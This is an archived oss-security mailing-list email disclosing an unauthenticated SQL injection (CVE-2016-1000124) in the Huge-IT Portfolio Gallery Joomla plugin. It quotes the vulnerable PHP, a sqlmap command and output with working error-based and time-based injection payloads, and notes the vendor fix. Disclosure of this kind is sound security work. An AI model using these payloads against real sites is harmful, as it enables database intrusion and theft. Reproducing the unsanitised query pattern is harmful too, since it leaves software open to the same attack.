X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2897" "Friday" "23" "September" "2016" "03:50:33" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<02DB2C41-3186-45AD-9FC9-639FE9B256C0@me.com>" "68" "[oss-security] Unauthenticated SQL Injection in Huge-IT Portfolio Gallery" nil nil nil "9" "2016092307:50:33" "[oss-security] Unauthenticated SQL Injection in Huge-IT Portfolio Gallery" (number mark "U       larry0@me.co Sep 23   68/2897  " thread-indent "\"[oss-security] Unauthenticated SQL Injection in Huge-IT Portfolio Gallery\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 30427 invoked by uid 550); 23 Sep 2016 07:50:55 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 30296 invoked from network); 23 Sep 2016 07:50:50 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
	t=1474617038; bh=Uc9JQqPKl4g3ebL+/bUsyfeIDNMxw5hsUv+qDCCefZQ=;
	h=Subject:From:Content-type:Message-id:Date:To:MIME-version;
	b=EsRfXJut/1siX8ihYp2sLc+HRmsimP2k7SX2dBX9gsrEiYwmPqqiV1TKOUv3IixFb
 AzB0imreSyVYTW2cfRwYluLqlm5abMDXdY9HYha+KApQuDVnZ2zgFiSoLDxbrgm7DQ
 aFLgCrrfaKykTceMLHqUkI20RQdrPfsyPV6k7qtEzSzHw7cnlsjqL55EJnUluSEV7E
 EEqdUTWm4iGk6a/cYX+ykfeggXR+AUkK/T2xs23QFIi2Imb9a+iHZstrLUnSwfU3SY
 5oa03+0a6mffwvx1IAwWFg5dsImBgfaPFw25ygbG+Xwc0Brj9P4zyD8cPBRMoMF8ae
 yHN9LVlMAHsQA==
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2016-09-23_04:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1034 suspectscore=1 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1603290000 definitions=main-1609230142
From: "Larry W. Cashdollar" <larry0@me.com>
Content-type: multipart/alternative;
 boundary=Apple-Mail-C5F20AE1-0226-4C55-9C41-AAB490ECC129
X-Mailer: iPad Mail (13G36)
Message-id: <02DB2C41-3186-45AD-9FC9-639FE9B256C0@me.com>
Date: Fri, 23 Sep 2016 03:50:33 -0400
To: oss-security@lists.openwall.com
Content-transfer-encoding: 7bit
MIME-version: 1.0 (1.0)
Subject: [oss-security] Unauthenticated SQL Injection in Huge-IT Portfolio Gallery

--Apple-Mail-C5F20AE1-0226-4C55-9C41-AAB490ECC129
Content-Type: text/plain;
	charset=us-ascii
Content-Transfer-Encoding: quoted-printable


Title: Unauthenticated SQL Injection in Huge-IT Portfolio Gallery Plugin v1=
.0.6
Author: Larry W. Cashdollar, @_larry0
Date: 2016-09-16
Download Site: http://huge-it.com/joomla-portfolio-gallery/
Vendor: huge-it.com, fixed v1.0.7
Vendor Notified: 2016-09-17
Vendor Contact: info@huge-it.com
Description: Huge-IT Portfolio Gallery extension can do wonders with your w=
ebsite. If you wish to show your photos, videos, enclosing the additional i=
mages and videos, then this Portfolio Gallery extension is what you need.
Vulnerability:
The following lines allow unauthenticated users to perform SQL injection ag=
ainst the functions in ajax_url.php: In file ajax_url.php: 11 define('_JEXE=
C',1); 12 defined('_JEXEC') or die('Restircted access'); . . . 49 $page =3D=
 $_POST["page"]; 50 $num=3D$_POST['perpage']; 51 $start =3D $page * $num - =
$num; 52 $idofgallery=3D$_POST['galleryid']; 53 $level =3D $_POST['level'];=
 54 $query =3D $db->getQuery(true); 55 $query->select('*'); 56 $query->from=
('#__huge_itportfolio_images'); 57 $query->where('portfolio_id =3D'.$idofga=
llery); 58 $query ->order('#__huge_itportfolio_images.ordering asc'); 59 $d=
b->setQuery($query,$start,$num);
CVE-2016-1000124

Exploit Code:
$ sqlmap -u 'http://example.com/components/com_portfoliogallery/ajax_url.ph=
p' --data=3D"page=3D1&galleryid=3D*&post=3Dhuge_it_portfolio_gallery_ajax&p=
erpage=3D20&linkbutton=3D2" --level=3D5 --risk=3D3
=20
=20
(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing th=
e others (if any)? [y/N]
sqlmap identified the following injection point(s) with a total of 2870 HTT=
P(s) requests:
---
Parameter: #1* ((custom) POST)
 Type: error-based
 Title: MySQL OR error-based - WHERE or HAVING clause (FLOOR)
 Payload: page=3D1&galleryid=3D-2264 OR 1 GROUP BY CONCAT(0x71716a7a71,(SEL=
ECT (CASE WHEN (3883=3D3883) THEN 1 ELSE 0 END)),0x7178627071,FLOOR(RAND(0)=
*2)) HAVING MIN(0)#&post=3Dhuge_it_portfolio_gallery_ajax&perpage=3D20&link=
button=3D2
=20
 Type: AND/OR time-based blind
 Title: MySQL >=3D 5.0.12 time-based blind - Parameter replace
 Payload: page=3D1&galleryid=3D(CASE WHEN (9445=3D9445) THEN SLEEP(5) ELSE =
9445 END)&post=3Dhuge_it_portfolio_gallery_ajax&perpage=3D20&linkbutton=3D2
---
[13:30:39] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8.0 (jessie)
web application technology: Apache 2.4.10
back-end DBMS: MySQL >=3D 5.0.12
[13:30:39] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 2715 times
[13:30:39] [INFO] fetched data logged to text files under '/home/larry/.sql=
map/output/192.168.0.4'
=20
[*] shutting down at 13:30:39

Advisory: http://www.vapidlabs.com/advisory.php?v=3D170


--Apple-Mail-C5F20AE1-0226-4C55-9C41-AAB490ECC129--
